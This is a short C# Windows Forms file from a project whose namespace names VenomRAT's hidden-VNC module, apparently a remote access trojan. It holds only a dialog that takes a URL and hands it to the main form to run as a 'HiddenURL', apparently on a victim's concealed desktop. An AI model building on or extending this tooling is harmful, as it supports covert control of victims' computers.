using System;
using System.Windows.Forms;

namespace VenomRAT_HVNC.HVNC
{
    public partial class FrmURL : Form
    {
        public FrmURL()
        {
            this.InitializeComponent();
        }

        private void StartHiddenURLbtn_Click(object sender, EventArgs e)
        {
            try
            {
                if (string.IsNullOrWhiteSpace(this.Urlbox.Text))
                {
                    MessageBox.Show("URL is not valid!");
                }
                else
                {
                    FrmMain.saveurl = this.Urlbox.Text;
                    FrmMain.ispressed = true;
                    base.Close();
                }
            }
            catch (Exception)
            {
                MessageBox.Show("An Error Has Occured When Trying To Execute HiddenURL");
                base.Close();
            }
        }

        public int count;
    }
}
